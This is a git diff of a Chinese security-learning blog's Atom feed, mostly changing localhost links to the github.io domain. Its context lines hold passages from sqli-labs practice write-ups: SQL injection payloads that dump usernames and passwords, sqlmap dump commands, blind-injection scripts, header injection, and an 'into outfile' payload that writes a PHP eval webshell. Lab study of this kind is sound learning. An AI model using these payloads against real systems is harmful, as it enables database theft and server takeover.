@@ -1,19 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>http://localhost:4000</id>
+    <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T12:55:01.712Z</updated>
+    <updated>2022-04-14T13:19:47.562Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="http://localhost:4000"/>
-    <link rel="self" href="http://localhost:4000/atom.xml"/>
+    <link rel="alternate" href="https://z0ekball.github.io"/>
+    <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
     <subtitle>温故而知新</subtitle>
-    <logo>http://localhost:4000/images/avatar.png</logo>
-    <icon>http://localhost:4000/favicon.ico</icon>
+    <logo>https://z0ekball.github.io/images/avatar.png</logo>
+    <icon>https://z0ekball.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, z0ekball</rights>
     <entry>
         <title type="html"><![CDATA[秋季赛WP]]></title>
-        <id>http://localhost:4000/post/qiu-ji-sai-wp/</id>
-        <link href="http://localhost:4000/post/qiu-ji-sai-wp/">
+        <id>https://z0ekball.github.io/post/qiu-ji-sai-wp/</id>
+        <link href="https://z0ekball.github.io/post/qiu-ji-sai-wp/">
         </link>
         <updated>2021-10-20T12:25:04.000Z</updated>
         <content type="html"><![CDATA[<h1 id="秋季赛wp">秋季赛WP</h1>
@@ -151,8 +151,8 @@ username=1'or(length(database())&gt;7)#&amp;password=   try again
     </entry>
     <entry>
         <title type="html"><![CDATA[提权学习]]></title>
-        <id>http://localhost:4000/post/ti-quan/</id>
-        <link href="http://localhost:4000/post/ti-quan/">
+        <id>https://z0ekball.github.io/post/ti-quan/</id>
+        <link href="https://z0ekball.github.io/post/ti-quan/">
         </link>
         <updated>2021-08-14T06:14:33.000Z</updated>
         <content type="html"><![CDATA[<p><code>提权前提</code>：</p>
@@ -161,7 +161,7 @@ username=1'or(length(database())&gt;7)#&amp;password=   try again
 <p>3.存在提权漏洞</p>
 <h3 id="信息收集">信息收集</h3>
 <h4 id="命令行">命令行</h4>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1649935140181.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1649935140181.png" alt="" loading="lazy"></figure>
 <p>查看远程控制是否开启：</p>
 <pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDebyTSConnections
 </code></pre>
@@ -291,8 +291,8 @@ sC delete &quot;Sa feDogCloudHelper&quot;
     </entry>
     <entry>
         <title type="html"><![CDATA[简单木马]]></title>
-        <id>http://localhost:4000/post/jian-dan-mu-ma/</id>
-        <link href="http://localhost:4000/post/jian-dan-mu-ma/">
+        <id>https://z0ekball.github.io/post/jian-dan-mu-ma/</id>
+        <link href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
         </link>
         <updated>2021-08-10T11:12:06.000Z</updated>
         <content type="html"><![CDATA[<h2 id="一句话木马">一句话木马</h2>
@@ -400,8 +400,8 @@ $a = array($arrayName = ($arrayName =($arrayName = array('a' =&gt; $b($_POST['pa
     </entry>
     <entry>
         <title type="html"><![CDATA[文件包含]]></title>
-        <id>http://localhost:4000/post/wen-jian-bao-han/</id>
-        <link href="http://localhost:4000/post/wen-jian-bao-han/">
+        <id>https://z0ekball.github.io/post/wen-jian-bao-han/</id>
+        <link href="https://z0ekball.github.io/post/wen-jian-bao-han/">
         </link>
         <updated>2021-07-29T02:59:27.000Z</updated>
         <content type="html"><![CDATA[<p><code>漏洞原理</code>：include()、include_once()、require()、require_once()等函数可以直接以php格式执行包含文件的代码，不受文件格式限制。web应用这些函数，且包含的文件路径是由用户传输参数方式引入，用户访问被包含文件时该文件以php格式解析。攻击者需要知道文件存放的路径才能进行访问。</p>
@@ -502,8 +502,8 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
     </entry>
     <entry>
         <title type="html"><![CDATA[文件上传]]></title>
-        <id>http://localhost:4000/post/wen-jian-shang-chuan/</id>
-        <link href="http://localhost:4000/post/wen-jian-shang-chuan/">
+        <id>https://z0ekball.github.io/post/wen-jian-shang-chuan/</id>
+        <link href="https://z0ekball.github.io/post/wen-jian-shang-chuan/">
         </link>
         <updated>2021-07-27T08:23:05.000Z</updated>
         <content type="html"><![CDATA[<h2 id="文件上传漏洞">文件上传漏洞</h2>
@@ -629,8 +629,8 @@ alt="image-20211019191350117" style="zoom:100%;" /></p>
     </entry>
     <entry>
         <title type="html"><![CDATA[sqli-labs(11~20)脚本、sqlmap学习]]></title>
-        <id>http://localhost:4000/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
-        <link href="http://localhost:4000/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
+        <id>https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/</id>
+        <link href="https://z0ekball.github.io/post/sqli-labs11~20jiao-ben-sqlmap-xue-xi/">
         </link>
         <updated>2021-06-18T14:56:25.000Z</updated>
         <content type="html"><![CDATA[<h1 id="sqlmap知识补充">sqlmap知识补充</h1>
@@ -641,15 +641,15 @@ alt="image-20211019191350117" style="zoom:100%;" /></p>
 <h3 id="上传post文件得到参数">上传post文件，得到参数</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot;
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1624290761761.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624290761761.png" alt="" loading="lazy"></figure>
 <h3 id="根据参数得到当前数据库">根据参数，得到当前数据库</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname --dbs
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1624290826466.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624290826466.png" alt="" loading="lazy"></figure>
 <h3 id="获取用户名和密码">获取用户名和密码</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-11.txt&quot; -p uname -T &quot;users&quot;  -C &quot;username&quot;,&quot;password&quot; --dump
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1624291100650.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624291100650.png" alt="" loading="lazy"></figure>
 <h3 id="脚本查询当前数据库名称采用盲注形式">脚本：查询当前数据库名称(采用盲注形式)</h3>
 <pre><code class="language-python">import requests #比urllib.parse方便
 name=&quot;&quot;
@@ -671,14 +671,14 @@ for i in range(1,30):
 print(name)
 </code></pre>
 <h3 id="结果">结果</h3>
-<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1624294940779.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624294940779.png" alt="" loading="lazy"></figure>
 <h1 id="less-12">less-12</h1>
 <p>uname=n&quot;) or 1=1 #,其他和11一样</p>
 <h1 id="less-13时间盲注">less-13(时间盲注)</h1>
 <h3 id="获取id和用户名">获取id和用户名</h3>
 <pre><code>sqlmap.py -r &quot;C:\Users\丷木丷\Desktop\less-13.txt&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;username&quot; --dump
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="http://localhost:4000/post-images/1624298061718.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624298061718.png" alt="" loading="lazy"></figure>
 <h3 id="脚本获取id3的用户名参考时间盲注">脚本：获取id=3的用户名，参考时间盲注</h3>
 <pre><code class="language-python">import requests
 import time
@@ -705,7 +705,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-2">结果</h3>
-<figure data-type="image" tabindex="6"><img src="http://localhost:4000/post-images/1624298188766.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624298188766.png" alt="" loading="lazy"></figure>
 <h1 id="less-14">less-14</h1>
 <p>和13一样的时间盲注，但注意转义成 \&quot;</p>
 <h3 id="脚本获取库">脚本：获取库</h3>
@@ -735,7 +735,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-3">结果</h3>
-<figure data-type="image" tabindex="7"><img src="http://localhost:4000/post-images/1624299560173.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624299560173.png" alt="" loading="lazy"></figure>
 <h1 id="less-15密码注入点">less-15(密码注入点)</h1>
 <p>和前面一样，注入点改为密码</p>
 <h3 id="脚本获取库-2">脚本：获取库</h3>
@@ -765,7 +765,7 @@ for i in range(1,10):
 print(name)
 </code></pre>
 <h3 id="结果-4">结果</h3>
-<figure data-type="image" tabindex="8"><img src="http://localhost:4000/post-images/1624300007923.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624300007923.png" alt="" loading="lazy"></figure>
 <h1 id="less-16">less-16</h1>
 <p>uname=addmin&amp;passwd=ad&quot; or 1=1 #，注意\&quot;，其他和15一样</p>
 <h1 id="less-17updatexml报错注入">less-17(updatexml报错注入)</h1>
@@ -781,7 +781,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果在报错信息中可见库">结果：在报错信息中可见库</h3>
-<figure data-type="image" tabindex="9"><img src="http://localhost:4000/post-images/1624304453223.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624304453223.png" alt="" loading="lazy"></figure>
 <h1 id="less-18user-agent注入">less-18(user-agent注入)</h1>
 <h3 id="脚本post请求修改请求头的user-agent-bibi赖赖转义改的心态崩了">脚本：post请求修改请求头的user-agent    (bibi赖赖：转义改的心态崩了= =)</h3>
 <pre><code class="language-python">import requests
@@ -799,7 +799,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果-5">结果</h3>
-<figure data-type="image" tabindex="10"><img src="http://localhost:4000/post-images/1624307139151.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/1624307139151.png" alt="" loading="lazy"></figure>
 <h1 id="less-19referer注入">less-19(referer注入)</h1>
 <h3 id="脚本跟18一样改成referer就行同样需要转义">脚本：跟18一样，改成referer就行，同样需要转义</h3>
 <pre><code class="language-python">import requests
@@ -817,7 +817,7 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果-6">结果</h3>
-<figure data-type="image" tabindex="11"><img src="http://localhost:4000/post-images/1624307491060.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/1624307491060.png" alt="" loading="lazy"></figure>
 <h1 id="less-20cookie注入">less-20(cookie注入)</h1>
 <p>cookie中value值' #注入</p>
 <h3 id="脚本">脚本</h3>
@@ -831,13 +831,13 @@ t=r.text
 print(t)
 </code></pre>
 <h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
-<figure data-type="image" tabindex="12"><img src="http://localhost:4000/post-images/1624308452186.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[sqli-labs(1~10)脚本、sqlmap学习]]></title>
-        <id>http://localhost:4000/post/sqli-jiao-ben/</id>
-        <link href="http://localhost:4000/post/sqli-jiao-ben/">
+        <id>https://z0ekball.github.io/post/sqli-jiao-ben/</id>
+        <link href="https://z0ekball.github.io/post/sqli-jiao-ben/">
         </link>
         <updated>2021-06-15T07:11:55.000Z</updated>
         <content type="html"><![CDATA[<h2 id="一些准备">一些准备</h2>
@@ -917,7 +917,7 @@ data = r.read()
 print(data)
 </code></pre>
 <h3 id="结果">结果</h3>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1624212566178.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624212566178.png" alt="" loading="lazy"></figure>
 <h1 id="less-2">less-2</h1>
 <p>id=-1--+，其他都一样</p>
 <h1 id="less-3">less-3</h1>
@@ -963,25 +963,25 @@ for i in range(1,20):
 print(name)
 </code></pre>
 <h3 id="结果-2">结果</h3>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1624215382215.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624215382215.png" alt="" loading="lazy"></figure>
 <h1 id="less-6sqlmap脚本">less-6（sqlmap+脚本）</h1>
 <p>（emmmmm,不得不说第一次使用sqlmap,怀疑自己之前爆破个库名都死去活来，是不是傻= =）</p>
 <h3 id="查看库名">查看库名</h3>
 <pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --dbs 
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1624216731977.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624216731977.png" alt="" loading="lazy"></figure>
 <h3 id="查看表名">查看表名</h3>
 <pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --tables
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1624216883317.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624216883317.png" alt="" loading="lazy"></figure>
 <h3 id="查看列名">查看列名</h3>
 <pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --columns
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="http://localhost:4000/post-images/1624217172590.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624217172590.png" alt="" loading="lazy"></figure>
 <h3 id="查看用户密码">查看用户密码</h3>
 <pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;password&quot; --dump
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="http://localhost:4000/post-images/1624218772000.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624218772000.png" alt="" loading="lazy"></figure>
 <h3 id="脚本查询id2的用户密码">脚本：查询id=2的用户密码</h3>
 <pre><code class="language-python"># 复制粘贴修改body
 import urllib.parse
@@ -1012,14 +1012,14 @@ for i in range(1,15):
 print(name)
 </code></pre>
 <h3 id="结果-3">结果</h3>
-<figure data-type="image" tabindex="7"><img src="http://localhost:4000/post-images/1624223954426.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
 <h1 id="less-7">less-7</h1>
 <p>id=1'))--+,布尔盲注，脚本基本一样<br>
 练习一下sqlmap</p>
 <h3 id="查询开头为a的用户和密码">查询开头为a的用户和密码</h3>
 <pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
 </code></pre>
-<figure data-type="image" tabindex="8"><img src="http://localhost:4000/post-images/1624275315411.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
 <h1 id="less-8">less-8</h1>
 <p>id=1'--+,其他一样</p>
 <h1 id="less-9时间盲注">less-9(时间盲注)</h1>
@@ -1054,15 +1054,15 @@ for i in range(1,15):
 print(name)
 </code></pre>
 <h3 id="结果-4">结果</h3>
-<figure data-type="image" tabindex="9"><img src="http://localhost:4000/post-images/1624287255225.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
 <h1 id="less-10">less-10</h1>
 <p>id=1&quot;--+,其他和9一样</p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[sqli-labs学习1~20]]></title>
-        <id>http://localhost:4000/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
-        <link href="http://localhost:4000/post/sql-zhu-ru-ji-chu-zhi-shi/">
+        <id>https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
+        <link href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
         </link>
         <updated>2021-06-05T12:22:39.000Z</updated>
         <content type="html"><![CDATA[<h5 id="注为方便学习加入两行代码">注：为方便学习,加入两行代码</h5>
@@ -1103,13 +1103,13 @@ id=-1' union select 1,2,group_concat(table_name) from information_schema. tables
 
 id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1623248765124.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
 <h3 id="连接查询用户名和密码所有用户和密码">连接查询用户名和密码/所有用户和密码</h3>
 <pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+
 
 id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1623248880427.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
 <h1 id="less-2">less-2</h1>
 <p>注入漏洞：id=1--+,不需要'</p>
 <h1 id="less-3">less-3</h1>
@@ -1143,8 +1143,8 @@ ascii(substr((select database()),1,1)2分法获得字符
 <h3 id="示例">示例</h3>
 <pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
 </code></pre>
-<p><img src="http://localhost:4000/post-images/1623250110147.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1623250114161.png" alt="" loading="lazy"></p>
+<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
 <h1 id="less-6">less-6</h1>
 <p>注入漏洞：id=1”--+,布尔型盲注</p>
 <h1 id="less-7一句话木马">less-7（一句话木马）</h1>
@@ -1162,8 +1162,8 @@ ascii(substr((select database()),1,1)2分法获得字符
 <h3 id="示例-2">示例</h3>
 <pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
 </code></pre>
-<p><img src="http://localhost:4000/post-images/1623251647771.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1623251657358.png" alt="" loading="lazy"></p>
+<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
+<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
 <h1 id="less-8">less-8</h1>
 <p>注入漏洞：id=1'--+,布尔盲注</p>
 <h1 id="less-9时间盲注">less-9（时间盲注）</h1>
@@ -1194,7 +1194,7 @@ uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd
 //查询用户~密码
 uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="http://localhost:4000/post-images/1623253088112.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
 <h1 id="less-12">less-12</h1>
 <p>注入漏洞：uname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
 <h1 id="less-13-布尔盲注">less-13 (布尔盲注)</h1>
@@ -1204,7 +1204,7 @@ uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from sec
 <pre><code class="language-sql">burp suite爆破：
 uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="http://localhost:4000/post-images/1623253489685.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
 <h1 id="less-14">less-14</h1>
 <p>注入漏洞：uname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
 布尔型盲注</p>
@@ -1229,7 +1229,7 @@ uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
 <pre><code class="language-sql">//返回当前数据库
 uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="http://localhost:4000/post-images/1623254628297.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
 <h1 id="less-18user-agent漏洞">less-18（User-Agent漏洞）</h1>
 <p>注入漏洞：<br>
 User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
@@ -1240,7 +1240,7 @@ User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
 <pre><code>//查库
 User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="http://localhost:4000/post-images/1623256440472.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
 <h1 id="less-19referer漏洞">less-19（Referer漏洞）</h1>
 <p>注入漏洞：Referer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
 注入点在referer,其他一样</p>
@@ -1250,8 +1250,8 @@ User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
     </entry>
     <entry>
         <title type="html"><![CDATA[关于zyy是只猪这件事]]></title>
-        <id>http://localhost:4000/post/a-sa-da-d/</id>
-        <link href="http://localhost:4000/post/a-sa-da-d/">
+        <id>https://z0ekball.github.io/post/a-sa-da-d/</id>
+        <link href="https://z0ekball.github.io/post/a-sa-da-d/">
         </link>
         <updated>2021-03-08T13:13:45.000Z</updated>
         <content type="html"><![CDATA[<h2 id="众所周知猪的睫毛很长">众所周知，猪的睫毛很长</h2>
